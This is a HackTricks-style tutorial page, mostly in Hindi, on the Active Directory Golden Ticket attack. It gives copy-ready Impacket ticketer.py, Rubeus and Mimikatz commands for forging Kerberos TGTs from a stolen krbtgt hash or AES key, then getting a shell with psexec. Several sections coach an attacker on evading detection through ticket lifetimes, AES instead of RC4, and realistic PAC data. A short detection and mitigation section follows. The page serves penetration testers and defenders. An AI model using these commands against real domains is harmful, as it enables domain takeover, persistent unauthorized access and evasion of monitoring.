# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

एक **Golden Ticket** attack में **Active Directory (AD) krbtgt account के NTLM hash** का उपयोग करके **किसी भी user का impersonation करने वाला एक legitimate Ticket Granting Ticket (TGT) बनाना** शामिल होता है। यह technique विशेष रूप से लाभदायक है क्योंकि यह impersonated user के रूप में domain के भीतर **किसी भी service या machine तक access** सक्षम करती है। यह याद रखना महत्वपूर्ण है कि **krbtgt account के credentials कभी भी automatically update नहीं होते**।<sup>[[1]](#references)</sup>

krbtgt account का **NTLM hash प्राप्त करने** के लिए विभिन्न methods का उपयोग किया जा सकता है। इसे **Local Security Authority Subsystem Service (LSASS) process** या domain के किसी भी Domain Controller (DC) पर मौजूद **NT Directory Services (NTDS.dit) file** से extract किया जा सकता है। इसके अतिरिक्त, **DCsync attack execute करना** भी इस NTLM hash को प्राप्त करने की एक strategy है, जिसे Mimikatz में **lsadump::dcsync module** या Impacket के **secretsdump.py script** जैसे tools का उपयोग करके perform किया जा सकता है। यह रेखांकित करना महत्वपूर्ण है कि इन operations को करने के लिए आमतौर पर **domain admin privileges या access के समान स्तर की आवश्यकता होती है**।<sup>[[2]](#references)</sup>

हालांकि NTLM hash इस उद्देश्य के लिए एक viable method है, लेकिन operational security reasons से **Advanced Encryption Standard (AES) Kerberos keys (AES128 और AES256)** का उपयोग करके tickets **forge करने की strongly recommendation की जाती है**। Modern domains में यह और भी महत्वपूर्ण है क्योंकि **RC4 का usage phase out किया जा रहा है** और Kerberos telemetry में यह कहीं अधिक स्पष्ट रूप से दिखाई देता है।<sup>[[5]](#references)</sup>
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

# Example
.\Rubeus.exe golden /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /user:stegosaurus /ptt /ldap /nowrap

#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
### Modern ticket crafting notes

जब संभव हो, पहले **LDAP और SYSVOL को query करें** और फिर उन्हें manually invent करने के बजाय वास्तविक domain policy और user PAC values का उपयोग करके ticket forge करें:<sup>[[4]](#references)</sup>
```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:<username> /ldap /printcmd /nowrap
```
- `/ldap` एक अधिक वास्तविक PAC बनाने के लिए DC से user, group, NetBIOS और policy data मांगता है।
- `/printcmd` retrieved PAC fields वाली एक offline command line print करता है, जो तब उपयोगी होती है जब आप बाद में LDAP को फिर से छुए बिना वही ticket forge करना चाहें।
- `/extendedupndns` नए `UpnDns` PAC elements जोड़ता है, जिनमें `samAccountName` और account SID शामिल होते हैं।
- `/oldpac` नए `Requestor` और `Attributes` PAC buffers को हटा देता है; यह मुख्य रूप से पुराने environments के साथ compatibility testing के लिए उपयोगी है, default tradecraft के लिए नहीं।

Linux से, recent Impacket versions नए PAC structures को add करने और एक realistic validity period सेट करने का भी support करते हैं:
```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-user-id 500 -groups 512,513,518,519 -duration 10 \
-extra-pac administrator
```
- `-duration` **hours** में है। डिफ़ॉल्ट **10 years** है, जो noisy होता है।
- `-extra-pac` नई `UPN_DNS` PAC information जोड़ता है।
- `-old-pac` legacy PAC layout को force करता है।
- `-extra-sid` तब उपयोगी होता है जब PAC को अतिरिक्त SIDs की आवश्यकता हो (उदाहरण के लिए, child-to-parent escalation scenarios में, जिन्हें [SID-History Injection](sid-history-injection.md) में कवर किया गया है)।

**जब** **golden Ticket injected** हो जाए, तो आप shared files **(C$)** को access कर सकते हैं और services तथा WMI execute कर सकते हैं, इसलिए shell प्राप्त करने के लिए **psexec** या **wmiexec** का उपयोग कर सकते हैं (ऐसा लगता है कि winrm के माध्यम से shell प्राप्त नहीं किया जा सकता)।

### सामान्य detections को bypass करना

golden ticket को detect करने के सबसे सामान्य तरीकों में wire पर **Kerberos traffic को inspect करना** शामिल है। डिफ़ॉल्ट रूप से, Mimikatz **TGT को 10 years के लिए sign करता है**, जो इसके साथ किए गए subsequent TGS requests में anomalous दिखाई देगा।

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

start offset, duration और maximum renewals (सभी minutes में) को नियंत्रित करने के लिए `/startoffset`, `/endin` और `/renewmax` parameters का उपयोग करें।
```
Get-DomainPolicy | select -expand KerberosPolicy
```
दुर्भाग्य से, TGT का lifetime 4769's में logged नहीं होता, इसलिए आपको यह information Windows event logs में नहीं मिलेगी। हालांकि, आप **बिना किसी prior 4768 के 4769's दिखाई देने** को correlate कर सकते हैं। **TGT के बिना TGS request करना संभव नहीं है**, और यदि TGT issue किए जाने का कोई record नहीं है, तो हम infer कर सकते हैं कि इसे offline forge किया गया था।

**Newer Windows builds** में Event IDs **4768** और **4769** अब कहीं बेहतर **encryption type telemetry** भी expose करते हैं। ऐसे domain में forged TGT/TGS का **RC4 (`0x17`)** का उपयोग करना, जहां `krbtgt`, clients और services के पास पहले से AES keys हैं, कुछ वर्ष पहले की तुलना में कहीं आसानी से detect किया जा सकता है। यह **AES-backed Golden Tickets** को prefer करने और domain की normal Kerberos policy से यथासंभव closely match करने का एक और कारण है।

एक अन्य OPSEC issue **PAC fidelity** है। Impossible group memberships वाले tickets, नए PAC buffers से missing tickets, या ऐसे account metadata जो LDAP से match नहीं करते, तब आसानी से detect हो जाते हैं जब defenders PAC contents को AD data के विरुद्ध validate करते हैं। यदि आपको ऐसा TGT चाहिए जो वास्तव में DC द्वारा issue किया हुआ लगे, तो review करें:

{{#ref}}
diamond-ticket.md
{{#endref}}

Persistence की **environmental limits** भी होती हैं। `krbtgt` account में **password history of 2** रहती है, इसलिए forged TGT **पहले** `krbtgt` reset के बाद भी valid रह सकता है, यदि उसे previous key से sign किया गया था। यही कारण है कि defenders **`krbtgt` को दो बार reset करके** और resets के बीच कम से कम domain के maximum ticket lifetime तक wait करके Golden Tickets को invalidate करते हैं।<sup>[[3]](#references)</sup>

इस **detection को bypass** करने के लिए diamond tickets check करें।

### Mitigation

- 4624: Account Logon
- 4672: Admin Logon
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Defenders द्वारा किए जा सकने वाले अन्य छोटे tricks में default domain administrator account जैसे **sensitive users** के लिए 4769's पर **alert** करना और उन domains में `krbtgt` के लिए **RC4 usage** पर alert करना शामिल है, जो normally AES tickets issue करते हैं।<sup>[[5]](#references)</sup>

## References

- [1] [Kerberos (II): How to attack Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Kerberos: Golden Tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
- [3] [AD Forest Recovery - Reset the krbtgt password | Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password)
- [4] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [5] [Microsoft – How to manage Kerberos KDC usage of RC4 for service account ticket issuance (CVE-2026-20833)](https://support.microsoft.com/en-us/topic/how-to-manage-kerberos-kdc-usage-of-rc4-for-service-account-ticket-issuance-changes-related-to-cve-2026-20833-1ebcda33-720a-4da8-93c1-b0496e1910dc)

{{#include ../../banners/hacktricks-training.md}}
